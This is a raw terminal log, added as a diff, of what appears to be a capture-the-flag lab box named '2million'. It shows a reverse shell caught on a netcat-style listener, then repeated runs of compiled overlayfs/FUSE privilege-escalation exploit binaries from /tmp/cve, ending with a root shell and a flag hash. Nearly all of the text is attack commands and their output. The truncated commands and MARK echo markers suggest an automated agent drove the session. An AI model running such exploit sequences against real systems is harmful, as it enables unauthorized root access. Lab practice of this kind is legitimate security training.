@@ -1,0 +1,84 @@
+Listening on 0.0.0.0 9003
+Connection received on 10.129.229.66 57058
+bash: cannot set terminal process group (1093): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$ <d +x fuse exp gc && ls -la fuse exp gc; echo MARK20
+-rwxr-xr-x 1 www-data www-data   17160 Nov 18 21:35 exp
+-rwxr-xr-x 1 www-data www-data 1407752 Nov 18 21:35 fuse
+-rwxr-xr-x 1 www-data www-data   16096 Nov 18 21:35 gc
+MARK20
+www-data@2million:/tmp/cve$ <r > /dev/null 2>&1 &) ; sleep 2; ./exp; echo MARK21
+total 8
+drwxr-xr-x 1 root root 4096 Nov 18 21:36 .
+drwxr-xr-x 7 root root 4096 Nov 18 21:36 ..
+uid:33 gid:33
+[+] mount success
+sh: 1: ./ovlcap/upper/file: Permission denied
+[+] exploit success!
+MARK21
+www-data@2million:/tmp/cve$ <grep -i fuse; ls -la ./ovlcap/lowerdir; echo MARK22
+[1] 2502
+[-] usage:
+./fuse [mount path] [shell path]
+fusectl on /sys/fs/fuse/connections type fusectl (rw,nosuid,nodev,noexec,relatime)
+total 8
+drwxr-xr-x 2 www-data www-data 4096 Nov 18 21:36 .
+drwxr-xr-x 7 www-data www-data 4096 Nov 18 21:36 ..
+MARK22
+www-data@2million:/tmp/cve$ <c >/tmp/fuse.log 2>&1 & sleep 3; ./exp; echo MARK23
+[1] 2511
+total 8
+drwxr-xr-x 1 root root 4096 Nov 18 21:37 .
+drwxr-xr-x 7 root root 4096 Nov 18 21:36 ..
+uid:33 gid:33
+[+] mount success
+sh: 1: ./ovlcap/upper/file: Permission denied
+[+] exploit success!
+MARK23
+www-data@2million:/tmp/cve$ <ve/ovlcap/upper/; mount | grep -c fuse; echo MARK24
+mkdir: File exists
+/tmp/cve/ovlcap/lowerdir/:
+total 0
+-rwsrwxrwx 1 root root 16096 Jan  1  1970 file
+
+/tmp/cve/ovlcap/upper/:
+total 8
+drwxr-xr-x 2 www-data www-data 4096 Nov 18 21:37 .
+drwxr-xr-x 7 www-data www-data 4096 Nov 18 21:36 ..
+-rw-r--r-- 1 www-data www-data    0 Nov 18 21:37 file
+2
+MARK24
+www-data@2million:/tmp/cve$ <unts | grep -vE "proc|sys|cgroup|snap"; echo MARK25
+/dev/sda2 on / type ext4 (rw,relatime)
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64)
+
+udev /dev devtmpfs rw,nosuid,relatime,size=1951800k,nr_inodes=487950,mode=755,inode64 0 0
+devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000 0 0
+tmpfs /run tmpfs rw,nosuid,nodev,noexec,relatime,size=401824k,mode=755,inode64 0 0
+tmpfs /dev/shm tmpfs rw,nosuid,nodev,inode64 0 0
+tmpfs /run/lock tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k,inode64 0 0
+mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
+/dev/fuse /tmp/cve/ovlcap/lowerdir fuse rw,nosuid,nodev,relatime,user_id=33,group_id=33 0 0
+MARK25
+www-data@2million:/tmp/cve$ < /tmp/fuse.log; tail -15 /tmp/fuse.log; echo MARK26
+1 /tmp/fuse.log
+0
+mkdir: File exists
+MARK26
+www-data@2million:/tmp/cve$ <cve/ovlcap/lowerdir; echo rc=\$?" 2>&1; echo MARK27
+file
+file
+rc=0
+MARK27
+www-data@2million:/tmp/cve$ <&1 & sleep 3; ls ./ovlcap/lower; ./exp; echo MARK28
+[2] 2592
+file
+total 8
+drwxr-xr-x 1 root   root     4096 Nov 18 21:39 .
+drwxr-xr-x 6 root   root     4096 Nov 18 21:39 ..
+-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
+uid:33 gid:33
+[+] mount success
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+3dd24e3bae4fa0c0244e61feae6516be
+ROOTDONE
